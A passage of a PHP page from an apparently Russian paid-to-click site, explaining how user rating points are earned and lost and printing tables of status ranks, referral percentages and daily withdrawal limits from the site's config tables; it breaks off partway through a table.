<?php
$pagetitle="Карьерный рост на ".$_SERVER["HTTP_HOST"];
require_once('.zsecurity.php');
include('header.php');

if(!isset($_SESSION["userLog"], $_SESSION["userPas"])) {
	echo '<span class="msg-error">Ошибка! Для доступа к этой странице необходимо авторизоваться!</span>';
}else{
	function CntTxt($count, $text1, $text2, $text3) {
		if($count>=0) {
			if( ($count>=10 && $count<=20) | (substr($count, -2, 2)>=10 && substr($count, -2, 2)<=20) ) {
				return "<b>$count</b> $text3";
			}else{
				switch(substr($count, -1, 1)){
					case 1: return "<b>$count</b> $text1"; break;
					case 2: case 3: case 4: return "<b>$count</b> $text2"; break;
					case 5: case 6: case 7: case 8: case 9: case 0: return "<b>$count</b> $text3"; break;
				}
			}
		}
	}

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_as' AND `howmany`='1'");
	$reit_as = mysql_result($sql,0,0);
	
	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_as_you' AND `howmany`='1'");
	$reit_as_you = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_ds' AND `howmany`='1'");
	$reit_ds = mysql_result($sql,0,0);
	
	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_you' AND `howmany`='1'");
	$reit_you = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_mails' AND `howmany`='1'");
	$reit_mails = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_dl' AND `howmany`='1'");
	$reit_dl = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_task' AND `howmany`='1'");
	$reit_task = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_ref' AND `howmany`='1'");
	$reit_ref = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_rek'");
	$reit_rek = mysql_result($sql,0,0);
	
	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_vip' AND `howmany`='1'");
	$reit_vip = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_ref_rek'");
	$reit_ref_rek = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_active' AND `howmany`='1'");
	$reit_active = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_noactive' AND `howmany`='1'");
	$reit_noactive = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_ban' AND `howmany`='1'");
	$reit_ban = mysql_result($sql,0,0);

	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='tests_reiting' AND `howmany`='1'");
	$tests_reiting = mysql_result($sql,0,0);

        $sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='cena_board_reit'");
	$cena_board_reit = mysql_result($sql,0,0);
	
	$sql = mysql_query("SELECT `price` FROM `tb_config` WHERE `item`='reit_kop'");
				$reit_kop = mysql_result($sql,0,0);

        //echo '<div style="color:#0000ff; font-size:12px;box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.6); padding:10px; margin:10px;background:#efe1fb" align="justify"> ';
	echo '<div style="/*color: #bb2ca7;*/font-size:12px;box-shadow: 0px 1px 3px rgba(0, 0, 0, 0.6);padding:10px;margin:10px;background: #f7e9e3;" align="justify">';
		echo '<b style="color:#E54100; margin-left:20px;">'.strtoupper($_SERVER["HTTP_HOST"]).'</b> дает возможность зарабатывать. А где работа, там должен быть и карьерный рост! Каждый пользователь на проекте может строить свою карьеру, увеличивая свой заработок в разы. Единица измерения карьерного роста - ваш <b>рейтинг</b>. Чем выше рейтинг - тем выше статус, больше преимуществ, больше заработок. Ниже показаны статусы, которыми обладают пользователи <b style="color:#E54100;">'.strtoupper($_SERVER["HTTP_HOST"]).'</b> и преимущества, которые эти статусы дают.';
	

	echo '<h2 class="sp">Как рассчитывается рейтинг?</h2>';
	echo '<div style="text-align: justify;">';
		echo '<b style="margin-left:20px;">Рейтинг</b> - важная составляющая вашего карьерного роста. Как заработать баллы рейтинга? Могут ли они уменьшаться? Обратите внимание, как рассчитывается рейтинг:';
	echo '</div>';

	echo '<ul class="green">';

		echo '<li>Просмотр ссылки в серфинге: <b>+'.number_format($reit_ds,2,'.','`').' балла</b></li>';
		echo '<li>Просмотр видеоролика в серфинге <span style="color: #3F3F3F;">You</span><span style="border-radius: 5px; background-color: #E62117; padding: 2px; color: #FFFFFF;">Tube</span>: <b>+'.number_format($reit_you,2,'.','`').' балла</b></li>';
		echo '<li>Просмотр ссылки в авто-серфинге: <b>+'.number_format($reit_as,2,'.','`').' балла</b></li>';
		echo '<li>Просмотр ссылки в авто-серфинге <span style="color: #3F3F3F;">You</span><span style="border-radius: 5px; background-color: #E62117; padding: 2px; color: #FFFFFF;">Tube</span>: <b>+'.number_format($reit_as_you,2,'.','`').' балла</b></li>';
		echo '<li>Прохождение теста: <b>+'.number_format($tests_reiting,2,'.','`').' балла</b></li>';
		echo '<li>Прочтение рекламного письма: <b>+'.number_format($reit_mails,2,'.','`').' балла</b></li>';
		//echo '<li>Скачивание файла (платные скачивания): <b>+'.number_format($reit_dl,2,'.','`').' балла</b></li>';
		echo '<li>Выполнение задания рекламодателя: <b>+'.number_format($reit_task,2,'.','`').' балла</b></li>';
		echo '<li>Привлечение реферала: <b>+'.number_format($reit_ref,2,'.','`').' балла</b></li>';
		echo '<li>За ежедневную активность: <b>+'.number_format($reit_active,2,'.','`').' балла</b></li>';
		echo '<li>За каждые полные <b>10 руб.</b> Потраченные на пополнение копилки проекта начисляется: <b>+'.number_format($reit_kop,2,'.','`').' баллов</b></li>';
		echo '<li>За каждое размещение аватара на доске почёта:  <b>+'.number_format($cena_board_reit,2,'.','`').' балла</b></li>';
               	echo '<li>За каждые полные 10 руб потраченные на оплату рекламы с рекламного счета <span style="color: #ff7f50;"><b>[кроме оплаты заданий]</b></span>: <b>+'.number_format($reit_rek,2,'.','`').' балла</b></li>';
               	echo '<li>За размещение <span style="color:#DE1200">VIP-ссылки в серфинге</span>: <b>+'.number_format($reit_vip,2,'.','`').' балл</b></li>';
               	echo '<li>За размещения <span style="color:#DE1200">VIP-баннера в серфинге</span>: <b>+'.number_format($reit_vip,2,'.','`').' баллов</b></li>';
               	echo '<li>За размещение <span style="color:#DE1200">VIP-ролика в серфинге</span> <span style="color: #3F3F3F;">You</span><span style="border-radius: 5px; background-color: #E62117; padding: 2px; color: #FFFFFF;">Tube</span>: <b>+'.number_format($reit_vip,2,'.','`').' балл</b></li>';
		echo '<li>За каждые полные 10 руб потраченные рефералом на оплату рекламы с рекламного счета: <b>+'.number_format($reit_ref_rek,2,'.','`').' балла</b></li>';
		
	echo '</ul>';
	echo '<ul class="red">';
		echo '<li>Отсутствие активности в течении недели(7 дней): <b>-'.number_format(abs($reit_noactive),2,'.','`').' баллов</b></li>';
		echo '<li>Бан на форуме: <b>-'.number_format(abs($reit_ban),2,'.','`').' баллов</b></li>';
	echo '</ul>';

	$sql = mysql_query("SELECT * FROM `tb_config_rang` ORDER BY `id` ASC");
	if(mysql_num_rows($sql)>0) {
		while ($row = mysql_fetch_array($sql)) {
			$rang_arr[] = $row["rang"];
			$r_ot_arr[] = $row["r_ot"];
			$r_do_arr[] = $row["r_do"];
			$r_c_1_arr[] = $row["c_1"];
			$r_c_2_arr[] = $row["c_2"];
			$r_c_3_arr[] = $row["c_3"];
			//$r_c_4_arr[] = $row["c_4"];
			//$r_c_5_arr[] = $row["c_5"];
			$r_m_1_arr[] = $row["m_1"];
			$r_m_2_arr[] = $row["m_2"];
			$r_m_3_arr[] = $row["m_3"];
			//$r_m_4_arr[] = $row["m_4"];
			//$r_m_5_arr[] = $row["m_5"];
			$r_t_1_arr[] = $row["t_1"];
			$r_t_2_arr[] = $row["t_2"];
			$r_t_3_arr[] = $row["t_3"];
			//$r_t_4_arr[] = $row["t_4"];
			//$r_t_5_arr[] = $row["t_5"];
			$r_test_1_arr[] = $row["test_1"];
			$r_test_2_arr[] = $row["test_2"];
			$r_test_3_arr[] = $row["test_3"];
			//$r_test_4_arr[] = $row["test_4"];
			//$r_test_5_arr[] = $row["test_5"];
			$r_youtube_1_arr[] = $row["youtube_1"];
			$r_youtube_2_arr[] = $row["youtube_2"];
			$r_youtube_3_arr[] = $row["youtube_3"];
			//$r_youtube_4_arr[] = $row["youtube_4"];
			//$r_youtube_5_arr[] = $row["youtube_5"];
			$r_pv_1_arr[] = $row["pv_1"];
			$r_pv_2_arr[] = $row["pv_2"];
			$r_pv_3_arr[] = $row["pv_3"];
			//$r_pv_4_arr[] = $row["pv_4"];
			//$r_pv_5_arr[] = $row["pv_5"];
			$r_balance_1_arr[] = $row["balance_1"];
			$wall_comm_arr[] = $row["wall_comm"];
			$max_pay_arr[] = round($row["max_pay"],2);
			$pay_min_click_arr[] = $row["pay_min_click"];
			
		}
	}


	echo '<h2 class="sp">Статусы</h2>';
	echo '<div style="text-align: justify;">';
		echo '<span style="margin-left:20px;">Для</span> наглядной визуализации карьерного роста пользователя используются статусы. Эти статусы нельзя купить. Статусы назначаются бесплатно и автоматически при достижении пользователем определённых условий. Статусы постоянны и не исчезают со временем, если пользователь не теряет рейтинг. Среди них: "'.$rang_arr[0].'", "'.$rang_arr[1].'", "'.$rang_arr[2].'", "'.$rang_arr[3].'", "'.$rang_arr[4].'", "'.$rang_arr[5].'".';
	echo '</div>';

	echo '<h5 class="sp">Статус: "'.$rang_arr[0].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo 'Статус "'.$rang_arr[0].'" получают все пользователи, сразу после прохождения процедуры регистрации на проекте. Это самый начальный и самый минимальный статус. Пользователи со статусом "'.$rang_arr[0].'" не получают реферальные отчисления от рефералов II,III уровня.';
	echo '</div>';

	echo '<h5 class="sp">Статус: "'.$rang_arr[1].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo 'Статус "'.$rang_arr[1].'" это основной статус в системе. Пользователи со статусом "'.$rang_arr[1].'" получают стандартные реферальные отчисления. <span style="color: #FF0000;">Для получения статуса "'.$rang_arr[1].'", нужно набрать всего '.$r_ot_arr[1].' баллов рейтинга.</span>';
	echo '</div>';

	echo '<h5 class="sp">Статус: "'.$rang_arr[2].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo 'Статус "'.$rang_arr[2].'" это повышенный статус в системе. По сравнению со "'.$rang_arr[1].'", "'.$rang_arr[2].'" получают повышенные реферальные отчисления. <span style="color: #FF0000;">Для получения статуса "'.$rang_arr[2].'", нужно набрать '.$r_ot_arr[2].' баллов рейтинга.</span>';
	echo '</div>';

	echo '<h5 class="sp">Статус: "'.$rang_arr[3].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo 'Статус "'.$rang_arr[3].'" это повышенный статус в системе. Пользователи со статусом "'.$rang_arr[3].'" обладают всеми преимуществами статуса "'.$rang_arr[2].'", но имеют повышенные реферальные отчисления. <span style="color: #FF0000;">Для получения статуса "'.$rang_arr[3].'", нужно набрать '.$r_ot_arr[3].' баллов рейтинга.</span>';
	echo '</div>';

	echo '<h5 class="sp">Статус: "'.$rang_arr[4].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo 'Статус "'.$rang_arr[4].'" это повышенный статус в системе. Пользователи со статусом "'.$rang_arr[4].'" обладают всеми преимуществами статуса "'.$rang_arr[3].'", но имеют повышенные реферальные отчисления. <span style="color: #FF0000;">Для получения статуса "'.$rang_arr[4].'", нужно набрать '.$r_ot_arr[4].' баллов рейтинга.</span>';
	echo '</div>';

	echo '<h5 class="sp">Статус: "'.$rang_arr[5].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo 'Статус "'.$rang_arr[5].'" это максимальный статус в системе. Пользователи со статусом "'.$rang_arr[5].'" обладают всеми преимуществами статуса "'.$rang_arr[4].'", но имеют повышенные реферальные отчисления. <span style="color: #FF0000;">Для получения статуса "'.$rang_arr[5].'", нужно набрать '.$r_ot_arr[5].' баллов рейтинга.</span>';
	echo '</div>';
	
	echo '<h5 class="sp">Статус: "'.$rang_arr[6].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo 'Статус "'.$rang_arr[6].'" это повышенный статус в системе. Пользователи со статусом "'.$rang_arr[6].'" обладают всеми преимуществами статуса "'.$rang_arr[5].'", но имеют повышенные реферальные отчисления. <span style="color: #FF0000;">Для получения статуса "'.$rang_arr[6].'", нужно набрать '.$r_ot_arr[6].' баллов рейтинга.</span>';
	echo '</div>';
	
	echo '<h5 class="sp">Статус: "'.$rang_arr[7].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo 'Статус "'.$rang_arr[7].'" это повышенный статус в системе. Пользователи со статусом "'.$rang_arr[7].'" обладают всеми преимуществами статуса "'.$rang_arr[6].'", но имеют повышенные реферальные отчисления. <span style="color: #FF0000;">Для получения статуса "'.$rang_arr[7].'", нужно набрать '.$r_ot_arr[7].' баллов рейтинга.</span>';
	echo '</div>';
	
	echo '<h5 class="sp">Статус: "'.$rang_arr[8].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo 'Статус "'.$rang_arr[8].'" это повышенный статус в системе. Пользователи со статусом "'.$rang_arr[8].'" обладают всеми преимуществами статуса "'.$rang_arr[7].'", но имеют повышенные реферальные отчисления. <span style="color: #FF0000;">Для получения статуса "'.$rang_arr[8].'", нужно набрать '.$r_ot_arr[8].' баллов рейтинга.</span>';
	echo '</div>';
	
	echo '<h5 class="sp">Статус: "'.$rang_arr[9].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo 'Статус "'.$rang_arr[9].'" это максимальный статус в системе. Пользователи со статусом "'.$rang_arr[9].'" обладают всеми преимуществами статуса "'.$rang_arr[8].'", но имеют повышенные реферальные отчисления. <span style="color: #FF0000;">Для получения статуса "'.$rang_arr[9].'", нужно набрать '.$r_ot_arr[9].' баллов рейтинга.</span>';
	
	/*echo '<h5 class="sp">Статус: "'.$rang_arr[10].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo 'Статус "'.$rang_arr[10].'" это повышенный статус в системе. Пользователи со статусом "'.$rang_arr[10].'" обладают всеми преимуществами статуса "'.$rang_arr[9].'", но имеют повышенные реферальные отчисления. <span style="color: #FF0000;">Для получения статуса "'.$rang_arr[10].'", нужно набрать '.$r_ot_arr[10].' баллов рейтинга.</span>';
	echo '</div>';
	
	echo '<h5 class="sp">Статус: "'.$rang_arr[11].'"</h5>';
	echo '<div style="text-align: justify;">';
		echo 'Статус "'.$rang_arr[11].'" это максимальный статус в системе. Пользователи со статусом "'.$rang_arr[11].'" обладают всеми преимуществами статуса "'.$rang_arr[10].'", но имеют повышенные реферальные отчисления. <span style="color: #FF0000;">Для получения статуса "'.$rang_arr[11].'", нужно набрать '.$r_ot_arr[11].' баллов рейтинга.</span>';
*/

	echo '<h2 class="sp">Сравнительная таблица статусов</h2>';

	echo '<table align="center" border="1" width="100%" cellspacing="2" cellpadding="2" style="border-collapse: collapse; border: 1px solid #CCC;">';
	echo '<thead>';
		echo '<tr bgcolor="#ff7f50" align="center">';
			echo '<th style="color:#FFF; width:200px; border: 1px solid #CCC;">Статус:</th>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[0].'</td>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[1].'</td>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[2].'</td>';
		echo '</tr>';
		echo '<tr bgcolor="#FFFFAD" align="center">';
			echo '<th style="color:#E54100; border: 1px solid #CCC;">Рейтинг:</th>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">-</td>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[1].' - '.$r_do_arr[1].'</td>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[2].' - '.$r_do_arr[2].'</td>';
		echo '</tr>';
	echo '</thead>';
	echo '<tbody>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровней<br>(клики)</td>';
			echo '<td align="center">'.$r_c_1_arr[0].'% - '.$r_c_2_arr[0].'% - '.$r_c_3_arr[0].'%</td>';
			echo '<td align="center">'.$r_c_1_arr[1].'% - '.$r_c_2_arr[1].'% - '.$r_c_3_arr[1].'%</td>';
			echo '<td align="center">'.$r_c_1_arr[2].'% - '.$r_c_2_arr[2].'% - '.$r_c_3_arr[2].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровня<br>[YouTube]</td>';
			echo '<td align="center">'.$r_youtube_1_arr[0].'% - '.$r_youtube_2_arr[0].'% - '.$r_youtube_3_arr[0].'%</td>';
			echo '<td align="center">'.$r_youtube_1_arr[1].'% - '.$r_youtube_2_arr[1].'% - '.$r_youtube_3_arr[1].'%</td>';
			echo '<td align="center">'.$r_youtube_1_arr[2].'% - '.$r_youtube_2_arr[2].'% - '.$r_youtube_3_arr[2].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровней<br>(письма)</td>';
			echo '<td align="center">'.$r_m_1_arr[0].'% - '.$r_m_2_arr[0].'% - '.$r_m_3_arr[0].'%</td>';
			echo '<td align="center">'.$r_m_1_arr[1].'% - '.$r_m_2_arr[1].'% - '.$r_m_3_arr[1].'%</td>';
			echo '<td align="center">'.$r_m_1_arr[2].'% - '.$r_m_2_arr[2].'% - '.$r_m_3_arr[2].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровней<br>(задания)</td>';
			echo '<td align="center">'.$r_t_1_arr[0].'% - '.$r_t_2_arr[0].'% - '.$r_t_3_arr[0].'%</td>';
			echo '<td align="center">'.$r_t_1_arr[1].'% - '.$r_t_2_arr[1].'% - '.$r_t_3_arr[1].'%</td>';
			echo '<td align="center">'.$r_t_1_arr[2].'% - '.$r_t_2_arr[2].'% - '.$r_t_3_arr[2].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровня<br>[тесты]</td>';
			echo '<td align="center">'.$r_test_1_arr[0].'% - '.$r_test_2_arr[0].'% - '.$r_test_3_arr[0].'%</td>';
			echo '<td align="center">'.$r_test_1_arr[1].'% - '.$r_test_2_arr[1].'% - '.$r_test_3_arr[1].'%</td>';
			echo '<td align="center">'.$r_test_1_arr[2].'% - '.$r_test_2_arr[2].'% - '.$r_test_3_arr[2].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровня<br>[посещения]<br>(% от дохода сайта)</td>';
			echo '<td align="center">'.$r_pv_1_arr[0].'% - '.$r_pv_2_arr[0].'% - '.$r_pv_3_arr[0].'%</td>';
			echo '<td align="center">'.$r_pv_1_arr[1].'% - '.$r_pv_2_arr[1].'% - '.$r_pv_3_arr[1].'%</td>';
			echo '<td align="center">'.$r_pv_1_arr[2].'% - '.$r_pv_2_arr[2].'% - '.$r_pv_3_arr[2].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Вывод средств<br>[максимальная сумма в сутки]</td>';
			echo '<td align="center">'.$max_pay_arr[0].' руб.</td>';
			echo '<td align="center">'.$max_pay_arr[1].' руб.</td>';
			echo '<td align="center">'.$max_pay_arr[2].' руб.</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Кол-во серфинга для выплат [минимум в сутки]</td>';
			echo '<td align="center">'.($pay_min_click_arr[0]>0 ? $pay_min_click_arr[0] : "-").'</td>';
			echo '<td align="center">'.($pay_min_click_arr[1]>0 ? $pay_min_click_arr[1] : "-").'</td>';
			echo '<td align="center">'.($pay_min_click_arr[2]>0 ? $pay_min_click_arr[2] : "-").'</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I уровня<br><span style="font-size:10px">[от пополнения рекламного баланса]<br>[с внешних платежных систем]</span></td>';
			echo '<td align="center">'.($r_balance_1_arr[0]>0 ? $r_balance_1_arr[0]."%" : "-").'</td>';
			echo '<td align="center">'.($r_balance_1_arr[1]>0 ? $r_balance_1_arr[1]."%" : "-").'</td>';
			echo '<td align="center">'.($r_balance_1_arr[2]>0 ? $r_balance_1_arr[2]."%" : "-").'</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Возможность оставлять отзывы<br>на "стенах" пользователей</td>';
			echo '<td align="center">'.($wall_comm_arr[0]==1 ? "Да" : "Нет").'</td>';
			echo '<td align="center">'.($wall_comm_arr[1]==1 ? "Да" : "Нет").'</td>';
			echo '<td align="center">'.($wall_comm_arr[2]==1 ? "Да" : "Нет").'</td>';
		echo '</tr>';
	echo '</tbody>';
	echo '</table><br><br>';

	echo '<table align="center" border="1" width="100%" cellspacing="2" cellpadding="2" style="border-collapse: collapse; border: 1px solid #CCC;">';
	echo '<thead>';
		echo '<tr bgcolor="#ff7f50" align="center">';
			echo '<th style="color:#FFF; width:200px; border: 1px solid #CCC;">Статус:</th>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[3].'</td>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[4].'</td>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[5].'</td>';
		echo '</tr>';
		echo '<tr bgcolor="#FFFFAD" align="center">';
			echo '<th style="color:#E54100; border: 1px solid #CCC;">Рейтинг:</th>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[3].' - '.$r_do_arr[3].'</td>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[4].' - '.$r_do_arr[4].'</td>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[5].' - '.$r_do_arr[5].'</td>';
		echo '</tr>';
	echo '</thead>';
	echo '<tbody>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровней<br>(клики)</td>';
			echo '<td align="center">'.$r_c_1_arr[3].'% - '.$r_c_2_arr[3].'% - '.$r_c_3_arr[3].'%</td>';
			echo '<td align="center">'.$r_c_1_arr[4].'% - '.$r_c_2_arr[4].'% - '.$r_c_3_arr[4].'%</td>';
			echo '<td align="center">'.$r_c_1_arr[5].'% - '.$r_c_2_arr[5].'% - '.$r_c_3_arr[5].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровня<br>[YouTube]</td>';
			echo '<td align="center">'.$r_youtube_1_arr[3].'% - '.$r_youtube_2_arr[3].'% - '.$r_youtube_3_arr[3].'%</td>';
			echo '<td align="center">'.$r_youtube_1_arr[4].'% - '.$r_youtube_2_arr[4].'% - '.$r_youtube_3_arr[4].'%</td>';
			echo '<td align="center">'.$r_youtube_1_arr[5].'% - '.$r_youtube_2_arr[5].'% - '.$r_youtube_3_arr[5].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровней<br>(письма)</td>';
			echo '<td align="center">'.$r_m_1_arr[3].'% - '.$r_m_2_arr[3].'% - '.$r_m_3_arr[3].'%</td>';
			echo '<td align="center">'.$r_m_1_arr[4].'% - '.$r_m_2_arr[4].'% - '.$r_m_3_arr[4].'%</td>';
			echo '<td align="center">'.$r_m_1_arr[5].'% - '.$r_m_2_arr[5].'% - '.$r_m_3_arr[5].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровней<br>(задания)</td>';
			echo '<td align="center">'.$r_t_1_arr[3].'% - '.$r_t_2_arr[3].'% - '.$r_t_3_arr[3].'%</td>';
			echo '<td align="center">'.$r_t_1_arr[4].'% - '.$r_t_2_arr[4].'% - '.$r_t_3_arr[4].'%</td>';
			echo '<td align="center">'.$r_t_1_arr[5].'% - '.$r_t_2_arr[5].'% - '.$r_t_3_arr[5].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровней<br>[тесты]</td>';
			echo '<td align="center">'.$r_test_1_arr[3].'% - '.$r_test_2_arr[3].'% - '.$r_test_3_arr[3].'%</td>';
			echo '<td align="center">'.$r_test_1_arr[4].'% - '.$r_test_2_arr[4].'% - '.$r_test_3_arr[4].'%</td>';
			echo '<td align="center">'.$r_test_1_arr[5].'% - '.$r_test_2_arr[5].'% - '.$r_test_3_arr[5].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровня<br>[посещения]<br>(% от дохода сайта)</td>';
			echo '<td align="center">'.$r_pv_1_arr[3].'% - '.$r_pv_2_arr[3].'% - '.$r_pv_3_arr[3].'%</td>';
			echo '<td align="center">'.$r_pv_1_arr[4].'% - '.$r_pv_2_arr[4].'% - '.$r_pv_3_arr[4].'%</td>';
			echo '<td align="center">'.$r_pv_1_arr[5].'% - '.$r_pv_2_arr[5].'% - '.$r_pv_3_arr[5].'%</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Вывод средств<br>[максимальная сумма в сутки]</td>';
			echo '<td align="center">'.$max_pay_arr[3].' руб.</td>';
			echo '<td align="center">'.$max_pay_arr[4].' руб.</td>';
			echo '<td align="center">'.$max_pay_arr[5].' руб.</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Кол-во серфинга для выплат [минимум в сутки]</td>';
			echo '<td align="center">'.($pay_min_click_arr[3]>0 ? $pay_min_click_arr[3] : "-").'</td>';
			echo '<td align="center">'.($pay_min_click_arr[4]>0 ? $pay_min_click_arr[4] : "-").'</td>';
			echo '<td align="center">'.($pay_min_click_arr[5]>0 ? $pay_min_click_arr[5] : "-").'</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I уровня<br><span style="font-size:10px">[от пополнения рекламного баланса]<br>[с внешних платежных систем]</span></td>';
			echo '<td align="center">'.($r_balance_1_arr[3]>0 ? $r_balance_1_arr[3]."%" : "-").'</td>';
			echo '<td align="center">'.($r_balance_1_arr[4]>0 ? $r_balance_1_arr[4]."%" : "-").'</td>';
			echo '<td align="center">'.($r_balance_1_arr[5]>0 ? $r_balance_1_arr[5]."%" : "-").'</td>';
		echo '</tr>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Возможность оставлять отзывы<br>на "стенах" пользователей</td>';
			echo '<td align="center">'.($wall_comm_arr[3]==1 ? "Да" : "Нет").'</td>';
			echo '<td align="center">'.($wall_comm_arr[4]==1 ? "Да" : "Нет").'</td>';
			echo '<td align="center">'.($wall_comm_arr[5]==1 ? "Да" : "Нет").'</td>';
		echo '</tr>';
	echo '</tbody>';
	echo '</table><br><br>';
	
	echo '<table align="center" border="1" width="100%" cellspacing="2" cellpadding="2" style="border-collapse: collapse; border: 1px solid #CCC;">';
	echo '<thead>';
		echo '<tr bgcolor="#ff7f50" align="center">';
			echo '<th style="color:#FFF; width:200px; border: 1px solid #CCC;">Статус:</th>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[6].'</td>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[7].'</td>';
			echo '<td style="color:#FFF; border: 1px solid #CCC;">'.$rang_arr[8].'</td>';
		echo '</tr>';
		echo '<tr bgcolor="#FFFFAD" align="center">';
			echo '<th style="color:#E54100; border: 1px solid #CCC;">Рейтинг:</th>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[6].' - '.$r_do_arr[6].'</td>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[7].' - '.$r_do_arr[7].'</td>';
			echo '<td style="color:#E54100; border: 1px solid #CCC;">'.$r_ot_arr[8].' - '.$r_do_arr[8].'</td>';
		echo '</tr>';
	echo '</thead>';
	echo '<tbody>';
		echo '<tr>';
			echo '<td align="left" nowrap="nowrap" style="background: #F7F5E4; padding: 5px 10px;">Доход от рефералов I,II,III уровней<br>(клики)</td>';
			echo '<td align="center">'.$r_c_1_arr[6].'% - '.$r_c_2_arr[6].'% - '.$r_c_3_arr[6].'%</td>';
			echo '<td align="center">'.$r_c_1_arr[7].'% - '.$r_c_2_arr[7].'% - '.$r_c_3_arr[7].'%</td>';
